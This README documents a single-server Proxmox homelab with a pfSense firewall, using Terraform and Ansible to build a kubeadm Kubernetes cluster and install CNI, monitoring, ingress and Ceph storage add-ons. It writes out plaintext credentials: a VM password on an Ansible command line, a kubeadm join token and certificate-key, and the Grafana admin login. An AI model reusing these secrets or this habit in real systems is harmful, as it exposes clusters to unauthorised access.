## HomeLab Proxmox/Kubernetes Infrastructure

Objective: Proxmox as virtualization platform, terraform for IaC, ansible for CM (OPTIONAL: GitLab CI for CI/CD pipelines). Kubernetes kubeadm-based setup with terraform + ansible on ProxMox (using pfSense VM as GW/Firewall/VPN/LB/etc.)

Note: Using single Proxmox Server for this homelab (better setup ProxMox/Ceph cluster for production use)

Note: [Install ansible, packer, terraform, kubectl, helm, etc.: setup_laptop_ubuntu.sh](./utils/setup_laptop_ubuntu.sh)

## 1.HomeLab setup (Hardware/Network/etc.)

### 1.1.Managed Switch Configuration. 

What we ended up configuring:

- MGMT network port
- All other interfaces Trunked, with VLAN’s as layed out in my pfSense network declarations

### 1.2.Configure Virtal Bridges and VLANS (Proxmox)

```
root@pve:~# cat /etc/network/interfaces
# network interface settings; autogenerated
# Please do NOT modify this file directly, unless you know what
# you're doing.
#
# If you want to manage parts of the network configuration manually,
# please utilize the 'source' or 'source-directory' directives to do
# so.
# PVE will preserve these directives, but will NOT read its network
# configuration from sourced files, so do not attempt to move any of
# the PVE managed interfaces into external files!

auto lo
iface lo inet loopback

iface eno1 inet manual

iface enp5s0 inet manual

auto vmbr0
iface vmbr0 inet static
	address 192.168.1.99/24
	gateway 192.168.1.1
	bridge-ports eno1
	bridge-stp off
	bridge-fd 0
	bridge-vlan-aware yes
	bridge-vids 2-4094

auto vmbr1
iface vmbr1 inet manual
	bridge-ports enp5s0
	bridge-stp off
	bridge-fd 0
	bridge-vlan-aware yes
	bridge-vids 2-4094

auto vmbr1.200
iface vmbr1.200 inet static
	address 10.0.200.1/24

auto vmbr1.201
iface vmbr1.201 inet static
	address 10.0.201.1/24
```

### 1.3.Install pfSense VM and configure LAN/WAN/CEPH interface. Login to pfSense via UI and setup firewall rules/etc.

Note: When using VirtIO interfaces in Proxmox VE, hardware checksums must be disabled. Go to System > Advanced > Networking -> Enable "Disable hardware checksum offload".

<img src="pictures/PROXMOX-pve-network.png?raw=true" width="800">

<img src="pictures/PROXMOX-firewall-pf-VM-hardware.png?raw=true" width="800">

<img src="pictures/pfSense-interfaces-console-proxmox-VM.png?raw=true" width="800">

<img src="pictures/pfSense-interfaces-UI.png?raw=true" width="800">

<img src="pictures/pfSense-interfaces-WAN.png?raw=true" width="800">

<img src="pictures/pfSense-interfaces-LAN.png?raw=true" width="800">

<img src="pictures/pfSense-LAN-DHCP-Server.png?raw=true" width="800">

<img src="pictures/pfSense-Firewall-Rules-WAN.png?raw=true" width="800">

<img src="pictures/pfSense-Firewall-Rules-LAN.png?raw=true" width="800">

<img src="pictures/pfSense-Firewall-NAT-Outbound.png?raw=true" width="800">


## 2.Setup k8s cluster  

```
$ cd Infrastructure
```

### 2.1.Create ubuntu-base VM and setup VLANs:200 & 201 (devops/Parah0d!); get IP from VM console and setup ansible (inventory/etc.)
```
$ cd Ansible/ansible-base-image
$ cat inventories/prox_home 
[prox_home]
ubuntu-base ansible_host=10.0.200.8

$ cat defaults/main.yml 
---
new_hostname: ubuntu-base
cloud_provider: proxmox

$ cat vars/main.yml 
---
user_auth_key: |-
  ssh-rsa AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa davar@carbon
# the filename should match the one in ../files
interface_filename: 01-interface.yaml
timestamp_comment: '# history timestamping'

Note: Add ssh public key
$ sudo ip route add 10.0.200.0/24 via 192.168.1.14 dev wlp4s0
$ ip r s
$ ssh devops@10.0.200.8
$ ansible-playbook -i inventories/prox_home main.yml -e "ansible_user=devops ansible_ssh_pass=Parah0d! ansible_become_pass=Parah0d!"

...
PLAY RECAP ***********************************************************************************************************************************************************************************************************
ubuntu-base                : ok=19   changed=14   unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
```

### 2.2.Stop ubuntu-base and convert to template (we will use for k8s-nodes setup, for jfrog, etc. VMs)

<img src="pictures/PROXMOX-ubuntu-base-template.png?raw=true" width="800">


### 2.3.Clone a new VM from the base-image template and call it k8s-node , but don’t start it yet. Take note of the ID of the newly created VM, login to the Proxmox to setup cloud-init for VM (well be used by terraform next)
```


Go to Storage View -> Storage -> Add -> Directory
Give it an ID such as snippets, and specify any path on your host such as /snippets
Under Content choose Snippets and de-select Disk image (optional)
Upload (scp/rsync/whatever) your user-data, meta-data, network-config files to your proxmox server in /snippets/snippets/ (the directory should be there)

$ cd Terraform/cloud-init
$ scp k8s-node* root@192.168.1.99:/snippets/snippets

Finally, you just need to qm set with --cicustom, like this:

root@pve:~# qm set 102 --cicustom "user=snippets:snippets/k8s-node-ud.yml,network=snippets:snippets/k8s-node-nc.yml,meta=snippets:snippets/k8s-node-md.yml"

...
update VM 102: -cicustom user=snippets:snippets/k8s-node-ud.yml,network=snippets:snippets/k8s-node-nc.yml,meta=snippets:snippets/k8s-node-md.yml

Note: I had to run the following command to get "snippets" to show up as a type in the GUI:

pvesm set local --content images,rootdir,vztmpl,backup,iso,snippets

```
### 2.4. Start k8s-node VM and run ansible playbook

```
$ cd Ansible/ansible-k8s-node
$ cat roles/k8s_node/defaults/main.yml 
---
new_hostname: k8s-node
cloud_provider: proxmox
containerd_version: 1.4.12-1
kubernetes_version: 1.23.4-00
# list of Docker registries that will be contacted over HTTP
http_docker_registries: []

$ cat inventories/prox_home 
[prox_home]
k8s-node ansible_host=10.0.200.8

$ cat group_vars/prox_home.yml 
---
ansible_user: root
http_docker_registries:
  - 10.100.200.17:5000

$ ansible-playbook -i inventories/prox_home main.yml 

PLAY RECAP ***********************************************************************************************************************************************************************************************************
k8s-node                   : ok=19   changed=4    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   

$ ssh root@10.0.200.18
root@ubuntu-base:~# dpkg -l |grep kube
hi  kubeadm                               1.23.4-00                                                            amd64        Kubernetes Cluster Bootstrapping Tool
hi  kubectl                               1.23.4-00                                                            amd64        Kubernetes Command Line Tool
hi  kubelet                               1.23.4-00                                                            amd64        Kubernetes Node Agent
ii  kubernetes-cni                        0.8.7-00                                                             amd64        Kubernetes CNI


Note: Update k8s and containerd version Ref: https://kubernetes.io/blog/2022/05/03/kubernetes-1-24-release-announcement/

For example, the following container runtimes are being prepared, or have already been prepared, for Kubernetes:

containerd v1.6.4 and later, v1.5.11 and later
CRI-O 1.24 and later

root@ubuntu-base:~# apt list -a containerd
Listing... Done
containerd/hirsute-updates 1.5.5-0ubuntu3~21.04.1 amd64
containerd/hirsute-security 1.5.2-0ubuntu1~21.04.3 amd64
containerd/hirsute 1.4.4-0ubuntu1 amd64
```

### 2.5.Stop k8s-node VM and convert it to template 

Proxmox k8s-node Template used by terraform:

<img src="pictures/PROXMOX-k8s-node-template.png?raw=true" width="800">

Note: We can Hashicorp Packer (with previous ansible roles and ansible provisioner) to build ProxMox VM templates ( TODO ).

### 2.6. Provision k8s VMs (k8s-nodes) with terraform

Note: Using the telmate/proxmox provider for terraform.

Make sure to read the [documentation](https://registry.terraform.io/providers/Telmate/proxmox/latest/docs) to understand all the variables being used in the variables.tf file


#### Important variables to update

All mandatory variables are put in a file named 'terraform.tfvars'.

#### Edit terraform.tfvars file and save it
vim terraform.tfvars (setup PROXMOX_API_ENDPOINT, PROXMOX_PASSWORD, PROXMOX_NODE, etc)
````
PROXMOX_API_ENDPOINT = "https://XXX.XXX.XXX.XXX:8006/api2/json"
PROXMOX_PASSWORD = "YYYYYYYYYYYYYY"
PROXMOX_NODE = "ZZZZZZ"
DEFAULT_BRIDGE = "vmbr1"
DEFAULT_BRIDGE_TAG = "200"
...
CLONE_TEMPLATE = "k8s-node"
...
````
Description for all vars in terraform.tfvars is available in 'variables.tf' file.
Apart from the variables mentioned above you can also edit other variables in 'variables.tf' file.

Note: ProxMox Cluster related: Cloud-init snippets preparation (we use single ProxMox server for this homelab setup and don't have ProxMox/Ceph cluster installed):

In order to be able to use cloud-init snippets you should have a shared file storage available for all the nodes in the Proxmox cluster. This can easily be achieved by utilizing CephFS.

Assuming that CephFS is already available you have to create the following files under /mnt/pve/<cephfs_storage_name>/snippets/ on one of the Proxmox nodes:

Example snippets:
```
root@prox3-home:~# cd /mnt/pve/cephfs-home/snippets/
root@prox3-home:/mnt/pve/cephfs-home/snippets# cat k8s-node-md.yml 
dsmode: local
root@prox3-home:/mnt/pve/cephfs-home/snippets# cat k8s-node-nc.yml 
root@prox3-home:/mnt/pve/cephfs-home/snippets# cat k8s-node-ud.yml 
#cloud-config
bootcmd:
 - cloud-init-per once remove-machine-id rm /etc/machine-id
 - cloud-init-per once generate-machine-id systemd-machine-id-setup

```

#### Terraform Proxmox cloud-init related (terraform file: main.tf):

ProxMox Cluster with CephFS shared storage
```
  cicustom = "user=cephfs-home:snippets/k8s-node-ud.yml,network=cephfs-home:snippets/k8s-node-nc.yml,meta=cephfs-home:snippets/k8s-node-md.yml"

```
ProxMox single-node

```
  cicustom = "user=snippets:snippets/k8s-node-ud.yml,network=snippets:snippets/k8s-node-nc.yml,meta=snippets:snippets/k8s-node-md.yml"
```

#### Create the Proxmox VMs (k8s-nodes):

Note: We can setup terraform to provison k8s 3/5/etc. masters nodes for HA and N k8s workers via TF variables, for simple homelab/POC setup we will use 1 master and 2 workers.

```

$ cd Terraform
$ terraform init
$ terraform plan
$ terraform apply
```

We will have 3 Proxmox VMs with this terraform IaC setup: kmaster0, kworker0, kworker1 after `terraform apply`


`terraform apply` will also create an ansible inventory file. You can check if its formatted correctly by
```
ansible-inventory -v --list -i ansible/hosts
```

You can update 'hosts.tmpl' if you prefer some other format for your ansible inventory.

ansible inventory can be used to setup k8s cluster (kubeadm-based) 

Example `terraform apply` Output:
```
$ terraform apply
...
Apply complete! Resources: 4 added, 0 changed, 0 destroyed.

Outputs:

ansible_inventory = <<EOT
[masters]
kmaster0 ansible_host=10.0.200.18 ansible_port=22 ansible_user=root

[workers]
kworker0 ansible_host=10.0.200.19 ansible_port=22 ansible_user=root
kworker1 ansible_host=10.0.200.20 ansible_port=22 ansible_user=root


EOT


$ cat ansible/hosts 
[masters]
kmaster0 ansible_host=10.0.200.18 ansible_port=22 ansible_user=root

[workers]
kworker0 ansible_host=10.0.200.19 ansible_port=22 ansible_user=root
kworker1 ansible_host=10.0.200.20 ansible_port=22 ansible_user=root

```
<img src="pictures/PROXMOX-kmaster0-VM-summary.png?raw=true" width="800">
<img src="pictures/PROXMOX-kmaster0--VM-cloud-init.png?raw=true" width="800">
<img src="pictures/PROXMOX-kmaster0-VM-hardware.png?raw=true" width="800">
<img src="pictures/PROXMOX-kmaster0--VM-options.png?raw=true" width="800">



### 2.7.Prepare Proxmox VMs for k8s cluster (setup k8s nodes hostnames/packages/etc. via ansible):

```
$ cd Ansible/ansible-kubernetes-prepare
$ cat inventories/prox_home 
[prox_home]
kmaster0 ansible_host=10.0.200.18 ansible_port=22 ansible_user=root
kworker0 ansible_host=10.0.200.19 ansible_port=22 ansible_user=root
kworker1 ansible_host=10.0.200.20 ansible_port=22 ansible_user=root
$ ssh 10.0.200.18-20

$ ansible-playbook -i inventories/prox_home main.yml

...
PLAY RECAP ***********************************************************************************************************************************************************************************************************
kmaster0                   : ok=5    changed=4    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
kworker0                   : ok=5    changed=3    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   
kworker1                   : ok=5    changed=3    unreachable=0    failed=0    skipped=0    rescued=0    ignored=0   

```

### 2.8. Setup k8s cluster via ansible playbook/roles 

#### Edit ansible variable file and save it

```
% cd Ansible/ansible-kubernetes
% cp variables.yml.example variables.yaml
```

Note: For DNS/pfSense/HAProxy LB (k8s API servers setup) -> variables.yaml (k8s_control_plane_host = HAPROXY LB frontend IP/DNS name, or pfSense VirtualIP for HAProxy frontend) 

```
k8s_control_plane_host: 10.0.200.18 (OR HAProxy LB frontend IP/DNS name (pfSense WAN interface in this setup or Virual IP maped to HAProxy frontend)
k8s_control_plane_port: 443
k8s_api_host: 10.0.200.18 ( OR HAProxy LB frontend IP/DNS name (pfSense WAN interface in this setup or Virual IP maped to HAProxy frontend)

apiServer:
  certSANs:
    - {{ k8s_ip }} (OR  HAProxy LB frontend IP/DNS name : pfSense WAN interface in this setup or Virual IP maped to HAProxy frontend)
    - localhost
    - 127.0.0.1
    - HAProxy LB frontend IP/DNS name: pfSense WAN interface in this setup or Virual IP maped to HAProxy frontend)
```

```
$ cd Ansible/ansible-kubernetes
$ cp ../../Terraform/ansible/hosts ./prox_home 
$ cat prox_home 
[masters]
kmaster0 ansible_host=10.0.200.18 ansible_port=22 ansible_user=root

[workers]
kworker0 ansible_host=10.0.200.19 ansible_port=22 ansible_user=root
kworker1 ansible_host=10.0.200.20 ansible_port=22 ansible_user=root


$ cat variables.yml
# Ansible vars_file containing variable values for the setup

k8s_control_plane_host: 10.0.200.18
k8s_control_plane_port: 443
k8s_api_host: 10.0.200.18
k8s_cluster_name: dev-cluster

cluster_pool_ipv4_cidr: "172.20.0.0/15"
pod_pool_ipv4_cidr: "172.20.0.0/16"
service_pool_ipv4_cidr: "172.21.0.0/16"
			 
		 
$ ansible-playbook -i ./prox_home playbook.yml

...

PLAY RECAP ***********************************************************************************************************************************************************************************************************
kmaster0                   : ok=19   changed=10   unreachable=0    failed=0    skipped=7    rescued=0    ignored=0   
kworker0                   : ok=8    changed=5    unreachable=0    failed=0    skipped=7    rescued=0    ignored=0   
kworker1                   : ok=8    changed=5    unreachable=0    failed=0    skipped=7    rescued=0    ignored=0   

$ export KUBECONFIG=./admin.conf 
$ kubectl get node -o wide
NAME       STATUS   ROLES                  AGE   VERSION   INTERNAL-IP   EXTERNAL-IP   OS-IMAGE       KERNEL-VERSION      CONTAINER-RUNTIME
kmaster0   Ready    control-plane,master   15h   v1.23.4   10.0.200.18   <none>        Ubuntu 21.04   5.11.0-49-generic   containerd://1.4.12
kworker0   Ready    <none>                 15h   v1.23.4   10.0.200.19   <none>        Ubuntu 21.04   5.11.0-49-generic   containerd://1.4.12
kworker1   Ready    <none>                 15h   v1.23.4   10.0.200.20   <none>        Ubuntu 21.04   5.11.0-49-generic   containerd://1.4.12

$ kubectl get csr | awk '{ if ($6 == "Pending") { print } }' | awk '{ print $1 }'
csr-kjrql
csr-r9pkn
csr-smvch
csr-tmzpz

$ kubectl certificate approve $(kubectl get csr | awk '{ if ($6 == "Pending") { print } }' | awk '{ print $1 }')
certificatesigningrequest.certificates.k8s.io/csr-kjrql approved
certificatesigningrequest.certificates.k8s.io/csr-r9pkn approved
certificatesigningrequest.certificates.k8s.io/csr-smvch approved
certificatesigningrequest.certificates.k8s.io/csr-tmzpz approved

$ kubectl get csr
NAME        AGE   SIGNERNAME                                    REQUESTOR                 REQUESTEDDURATION   CONDITION
csr-2wwxq   13m   kubernetes.io/kube-apiserver-client-kubelet   system:node:kmaster0      <none>              Approved,Issued
csr-kjrql   13m   kubernetes.io/kubelet-serving                 system:node:kmaster0      <none>              Approved,Issued
csr-m8lrt   12m   kubernetes.io/kube-apiserver-client-kubelet   system:bootstrap:j08opk   <none>              Approved,Issued
csr-r9pkn   12m   kubernetes.io/kubelet-serving                 system:node:kmaster0      <none>              Approved,Issued
csr-smvch   12m   kubernetes.io/kubelet-serving                 system:node:kworker0      <none>              Approved,Issued
csr-sxps6   12m   kubernetes.io/kube-apiserver-client-kubelet   system:bootstrap:j08opk   <none>              Approved,Issued
csr-tmzpz   12m   kubernetes.io/kubelet-serving                 system:node:kworker1      <none>              Approved,Issued

root@kmaster0:~# cilium status
    /¯¯\
 /¯¯\__/¯¯\    Cilium:         OK
 \__/¯¯\__/    Operator:       OK
 /¯¯\__/¯¯\    Hubble:         disabled
 \__/¯¯\__/    ClusterMesh:    disabled
    \__/

DaemonSet         cilium             Desired: 3, Ready: 3/3, Available: 3/3
Deployment        cilium-operator    Desired: 2, Ready: 2/2, Available: 2/2
Containers:       cilium             Running: 3
                  cilium-operator    Running: 2
Cluster Pods:     2/2 managed by Cilium
Image versions    cilium             quay.io/cilium/cilium:v1.10.4@sha256:7d354052ccf2a7445101d78cebd14444c7c40129ce7889f2f04b89374dbf8a1d: 3
                  cilium-operator    quay.io/cilium/operator-generic:v1.10.4@sha256:c49a14e34634ff1a494c84b718641f27267fb3a0291ce3d74352b44f8a8d2f93: 2
root@kmaster0:~# whereis cilium
cilium: /usr/local/bin/cilium
```

Note: Example Manually k8s cluster setup using kubeadm (if we don't want to use ansible)

``` 
### Example manual k8s cluster setup:

root@kmaster0:~# cat clusterconfig.yaml 
apiVersion: kubeadm.k8s.io/v1beta2
kind: ClusterConfiguration
controlPlaneEndpoint: 10.0.200.18:6443
kubernetesVersion: 1.23.4
networking:
  podSubnet: "10.250.0.0/24"
---
apiVersion: kubelet.config.k8s.io/v1beta1
kind: KubeletConfiguration
serverTLSBootstrap: true

Note: We can use pfSense VirtualIP/WAN interface IP -> HAProxy frontend (or DNS name for HAProxy VirtualIP/WAN interface) 

root@kmaster0:~# kubeadm init --config clusterconfig.yaml --upload-certs
...
You can now join any number of the control-plane node running the following command on each as root:

  kubeadm join 10.0.200.18:6443 --token 84lgte.mopl5c3kybqe4o0r \
	--discovery-token-ca-cert-hash sha256:8bd49fb5a05f51a7122229e0a348bfdb81d58a6307cce347bdc16bccfced7b9a \
	--control-plane --certificate-key f0ec3a52bd405b83d6f74a2a39fe372a5bfd0169fa1754fec251a101e7e13733

Please note that the certificate-key gives access to cluster sensitive data, keep it secret!
As a safeguard, uploaded-certs will be deleted in two hours; If necessary, you can use
"kubeadm init phase upload-certs --upload-certs" to reload certs afterward.

Then you can join any number of worker nodes by running the following on each as root:

kubeadm join 10.0.200.18:6443 --token 84lgte.mopl5c3kybqe4o0r \
	--discovery-token-ca-cert-hash sha256:8bd49fb5a05f51a7122229e0a348bfdb81d58a6307cce347bdc16bccfced7b9a 
                          
### Join worker0/1 to k8s cluster:                          

# kubeadm join 10.0.200.18:6443 --token 84lgte.mopl5c3kybqe4o0r \
--discovery-token-ca-cert-hash sha256:8bd49fb5a05f51a7122229e0a348bfdb81d58a6307cce347bdc16bccfced7b9a 

### Install k8s CNI : Calico (or other K8s CNI) 

Note: coredns is stuck in the Pending state after ansible run (we comented CNI:culium ansible install) --> This is expected and part of the design. kubeadm is network provider-agnostic, so the admin should install the pod network add-on of choice. You have to install a Pod Network before CoreDNS may be deployed fully. Hence the Pending state before the network is set up. After CNI has been installed k8s cluster is fully setuped.

% cd system-chatrs/cni/calico-tigera
% cat env/values-prox-home.yaml 
tigeraOperator:
  installation:
    calicoNetwork:
      nodeAddressAutodetectionV4:
        cidrs:
          - 10.80.80.0/23
	  
% helm dependency update .
% helm install calico . --render-subchart-notes -f env/values-prox-home.yaml

### Get KUBECONFIG file and approve k8s certs (laptop/workstation):

% scp root@10.0.200.18:~/.kube/config ~/.kube/kubeadm-config
% export KUBECONFIG=~/.kube/kubeadm-config
% kubectl certificate approve $(kubectl get csr | awk '{ if ($6 == "Pending") { print } }' | awk '{ print $1 }')
% kubectl get csr                      
NAME        AGE     SIGNERNAME                                    REQUESTOR                 REQUESTEDDURATION   CONDITION
csr-7nvqk   11m     kubernetes.io/kubelet-serving                 system:node:kmaster0      <none>              Approved,Issued
csr-bgd4x   6m25s   kubernetes.io/kube-apiserver-client-kubelet   system:bootstrap:84lgte   <none>              Approved,Issued
csr-dt9jk   5m28s   kubernetes.io/kube-apiserver-client-kubelet   system:bootstrap:84lgte   <none>              Approved,Issued
csr-k2zh7   6m18s   kubernetes.io/kubelet-serving                 system:node:kworker1      <none>              Approved,Issued
csr-nzf44   11m     kubernetes.io/kubelet-serving                 system:node:kmaster0      <none>              Approved,Issued
csr-vl7rf   5m22s   kubernetes.io/kubelet-serving                 system:node:kworker0      <none>              Approved,Issued



### Install k8s add-ons: metric-server/prometheus/etc.
```

### 2.9. k8s add-ons install

Note: Some modifications needed for latest k8s: v.1.24. 

#### Note: CNI (calico) instead of Culium  

Note: Using cilium as k8s CNI for homelab, but we can create ansible roles for other k8s CNIs : calico/flanneld/weave/etc. (using Helm Charts or k8s manifests). For Calico CNI installation we can comment cilium role:

```
---
- name: install kubeadm and bootstrap the cluster
  hosts: all
  roles:
    - kubeadm
  vars_files:
    - variables.yml

```

run ansible-kubernetes -> certs aproove and after that install Calico k8s add-on for CNI via helm 

Note: coredns is stuck in the Pending state after ansible run (we comented CNI:culium ansible install) --> This is expected and part of the design. kubeadm is network provider-agnostic, so the admin should install the pod network add-on of choice. You have to install a Pod Network before CoreDNS may be deployed fully. Hence the Pending state before the network is set up. After CNI has been installed k8s cluster is fully setuped.

```
% cd K8S/system-chatrs/cni/calico-tigera
% cat env/values-prox-home.yaml 
tigeraOperator:
  installation:
    calicoNetwork:
      nodeAddressAutodetectionV4:
        cidrs:
          - 10.80.80.0/23
	  
% helm dependency update .
% helm install calico . --render-subchart-notes -f env/values-prox-home.yaml 
```
#### Check k8s cluster (after CNI has been installed)
```
% kubectl get node -o wide
NAME       STATUS   ROLES                  AGE   VERSION   INTERNAL-IP    EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION      CONTAINER-RUNTIME
kmaster0   Ready    control-plane,master   67m   v1.23.4   10.80.81.173   <none>        Ubuntu 20.04.4 LTS   5.4.0-100-generic   containerd://1.4.12
kworker0   Ready    <none>                 61m   v1.23.4   10.80.81.172   <none>        Ubuntu 20.04.4 LTS   5.4.0-100-generic   containerd://1.4.12
kworker1   Ready    <none>                 62m   v1.23.4   10.80.81.171   <none>        Ubuntu 20.04.4 LTS   5.4.0-100-generic   containerd://1.4.12

% kubectl get po --all-namespaces
NAMESPACE         NAME                                       READY   STATUS    RESTARTS      AGE
calico-system     calico-kube-controllers-67f85d7449-j425m   1/1     Running   0             86s
calico-system     calico-node-7k6kh                          1/1     Running   0             86s
calico-system     calico-node-lbw5k                          1/1     Running   0             86s
calico-system     calico-node-pr9hs                          1/1     Running   0             86s
calico-system     calico-typha-645f6dc575-fwllh              1/1     Running   0             78s
calico-system     calico-typha-645f6dc575-pnm8k              1/1     Running   0             87s
kube-system       coredns-64897985d-rx2mc                    1/1     Running   0             66m
kube-system       coredns-64897985d-zqt8v                    1/1     Running   0             66m
kube-system       etcd-kmaster0                              1/1     Running   1 (38m ago)   66m
kube-system       kube-apiserver-kmaster0                    1/1     Running   1 (38m ago)   66m
kube-system       kube-controller-manager-kmaster0           1/1     Running   1 (38m ago)   66m
kube-system       kube-proxy-7k8tc                           1/1     Running   1 (38m ago)   61m
kube-system       kube-proxy-8kxfm                           1/1     Running   1 (38m ago)   66m
kube-system       kube-proxy-hjfpt                           1/1     Running   1 (38m ago)   60m
kube-system       kube-scheduler-kmaster0                    1/1     Running   1 (38m ago)   66m
tigera-operator   tigera-operator-747d647775-754hx           1/1     Running   0             98s

```

#### K8s monitoring (metrics-server/prometheus/grafana)
```
$ cd K8S/system-charts/monitoring/metrics-server$  helm dependency update .
$ kubectl create ns metrics-server
$ helm dependency update .
$ helm install metrics-server . --render-subchart-notes -n metrics-server
	

$ cd K8S/system-charts/monitoring/prometheus
$  helm dependency update .
$ helm install prometheus . --render-subchart-notes -n prometheus --create-namespace
$ kubectl get secret --namespace prometheus prometheus-grafana  jsonpath="{.data.admin-password}" | base64 --decode ; echo
prom-operator
$ export POD_NAME=$(kubectl get pods --namespace prometheus -l "app.kubernetes.io/name=grafana,app.kubernetes.io/instance=prometheus" -o jsonpath="{.items[0].metadata.name}")
$ kubectl --namespace prometheus port-forward $POD_NAME 3000
Grafana UI: http://localhost:3000/?orgId=1 
Browser: http://localhost:3000 user/password: admin/prom-operator
```

<img src="pictures/monitorig-grafana-dashboards.png?raw=true" width="800">

<img src="pictures/monitorig-grafana-dashoards-cluster.png?raw=true" width="800">


#### K8s Ingress (nginx)
```
$ cd K8S/system-charts/ingress-controller/nginx-controller
$ helm dependency update .
$ helm install nginx . --render-subchart-notes -n ingress-nginx --create-namespace -f env/values-prox-home.yaml 
```

#### Check k8s after base k8s add-ons has been installed (kube ansivble install)

```
$ kubectl get po --all-namespaces
NAMESPACE        NAME                                                     READY   STATUS    RESTARTS   AGE
ingress-nginx    nginx-ingress-nginx-controller-f4fdf5f6b-489h9           1/1     Running   0          75s
ingress-nginx    nginx-ingress-nginx-controller-f4fdf5f6b-f9x4r           1/1     Running   0          75s
kube-system      cilium-ms7qq                                             1/1     Running   0          27m
kube-system      cilium-nh88s                                             1/1     Running   0          27m
kube-system      cilium-operator-594c94d754-8dvxg                         1/1     Running   0          27m
kube-system      cilium-operator-594c94d754-xbfhk                         1/1     Running   0          27m
kube-system      cilium-sxfv7                                             1/1     Running   0          27m
kube-system      coredns-64897985d-g77lm                                  1/1     Running   0          27m
kube-system      coredns-64897985d-kghfx                                  1/1     Running   0          27m
kube-system      etcd-kmaster0                                            1/1     Running   5          27m
kube-system      kube-apiserver-kmaster0                                  1/1     Running   2          27m
kube-system      kube-controller-manager-kmaster0                         1/1     Running   2          27m
kube-system      kube-scheduler-kmaster0                                  1/1     Running   2          27m
metrics-server   metrics-server-7d76b744cd-56ls4                          1/1     Running   0          10m
prometheus       alertmanager-prometheus-kube-prometheus-alertmanager-0   2/2     Running   0          8m24s
prometheus       prometheus-grafana-8568977b76-6cr9x                      3/3     Running   0          8m34s
prometheus       prometheus-kube-prometheus-operator-f786bd989-r2w5g      1/1     Running   0          8m34s
prometheus       prometheus-kube-state-metrics-94f76f559-sgp6k            1/1     Running   0          8m34s
prometheus       prometheus-prometheus-kube-prometheus-prometheus-0       2/2     Running   0          8m24s
prometheus       prometheus-prometheus-node-exporter-46fww                1/1     Running   0          8m34s
prometheus       prometheus-prometheus-node-exporter-kt4cv                1/1     Running   0          8m34s
prometheus       prometheus-prometheus-node-exporter-w4dd2                1/1     Running   0          8m34s

$ kubectl get po -o wide --all-namespaces
NAMESPACE        NAME                                                     READY   STATUS    RESTARTS   AGE     IP             NODE       NOMINATED NODE   READINESS GATES
ingress-nginx    nginx-ingress-nginx-controller-f4fdf5f6b-489h9           1/1     Running   0          2d14h   172.20.2.26    kworker1   <none>           <none>
ingress-nginx    nginx-ingress-nginx-controller-f4fdf5f6b-f9x4r           1/1     Running   0          2d14h   172.20.0.43    kworker0   <none>           <none>
kube-system      cilium-ms7qq                                             1/1     Running   0          2d14h   10.0.200.19    kworker0   <none>           <none>
kube-system      cilium-nh88s                                             1/1     Running   0          2d14h   10.0.200.18    kmaster0   <none>           <none>
kube-system      cilium-operator-594c94d754-8dvxg                         1/1     Running   0          2d14h   10.0.200.20    kworker1   <none>           <none>
kube-system      cilium-operator-594c94d754-xbfhk                         1/1     Running   0          2d14h   10.0.200.19    kworker0   <none>           <none>
kube-system      cilium-sxfv7                                             1/1     Running   0          2d14h   10.0.200.20    kworker1   <none>           <none>
kube-system      coredns-64897985d-g77lm                                  1/1     Running   0          2d14h   172.20.0.180   kworker0   <none>           <none>
kube-system      coredns-64897985d-kghfx                                  1/1     Running   0          2d14h   172.20.0.10    kworker0   <none>           <none>
kube-system      etcd-kmaster0                                            1/1     Running   5          2d14h   10.0.200.18    kmaster0   <none>           <none>
kube-system      kube-apiserver-kmaster0                                  1/1     Running   2          2d14h   10.0.200.18    kmaster0   <none>           <none>
kube-system      kube-controller-manager-kmaster0                         1/1     Running   2          2d14h   10.0.200.18    kmaster0   <none>           <none>
kube-system      kube-scheduler-kmaster0                                  1/1     Running   2          2d14h   10.0.200.18    kmaster0   <none>           <none>
metrics-server   metrics-server-7d76b744cd-56ls4                          1/1     Running   0          2d14h   172.20.2.51    kworker1   <none>           <none>
prometheus       alertmanager-prometheus-kube-prometheus-alertmanager-0   2/2     Running   0          2d14h   172.20.2.45    kworker1   <none>           <none>
prometheus       prometheus-grafana-8568977b76-6cr9x                      3/3     Running   0          2d14h   172.20.0.57    kworker0   <none>           <none>
prometheus       prometheus-kube-prometheus-operator-f786bd989-r2w5g      1/1     Running   0          2d14h   172.20.2.34    kworker1   <none>           <none>
prometheus       prometheus-kube-state-metrics-94f76f559-sgp6k            1/1     Running   0          2d14h   172.20.0.147   kworker0   <none>           <none>
prometheus       prometheus-prometheus-kube-prometheus-prometheus-0       2/2     Running   0          2d14h   172.20.0.35    kworker0   <none>           <none>
prometheus       prometheus-prometheus-node-exporter-46fww                1/1     Running   0          2d14h   10.0.200.18    kmaster0   <none>           <none>
prometheus       prometheus-prometheus-node-exporter-kt4cv                1/1     Running   0          2d14h   10.0.200.19    kworker0   <none>           <none>
prometheus       prometheus-prometheus-node-exporter-w4dd2                1/1     Running   0          2d14h   10.0.200.20    kworker1   <none>           <none>


$ kubectl get svc --all-namespaces
$ kubectl get all --all-namespaces
```

Grafana Dashborads:


Grafana Dashboard: Cluster 


#### CSI (Ceph) : OPTIONAL	 

Setup userKey: templates/ceph-secret.yaml userKey = XXXXXXXXXXXXXXXXXXXXXXXXXXXX or using <encryption_key> via env/values-prox-home.yaml.
Note: You can get client userKey: # cat /etc/pve/priv/ceph/ceph-k8s-home.keyring

```
% cd K8S/system-chatrs/csi/ceph-rbd
% helm dependency update .
% helm install ceph . --render-subchart-notes -n ceph-rbd --create-namespace -f env/values-prox-home.yaml
```
OR we can use Rook-Ceph Operator if not using CEPH (PROXMOX cluster -> internal CEPH cluster): https://rook.github.io/docs/rook/latest/Getting-Started/quickstart/#deploy-the-rook-operator

```

$ git clone https://github.com/rook/rook.git
$ cd rook/deploy/examples
$ kubectl create -f crds.yaml -f common.yaml -f operator.yaml
$ kubectl apply -f ./cluster-test.yaml

Cluster Environments
The Rook documentation is focused around starting Rook in a production environment. Examples are also provided to relax some settings for test environments. When creating the cluster later in this guide, consider these example cluster manifests:

- cluster.yaml: Cluster settings for a production cluster running on bare metal. Requires at least three worker nodes.
- cluster-on-pvc.yaml: Cluster settings for a production cluster running in a dynamic cloud environment.
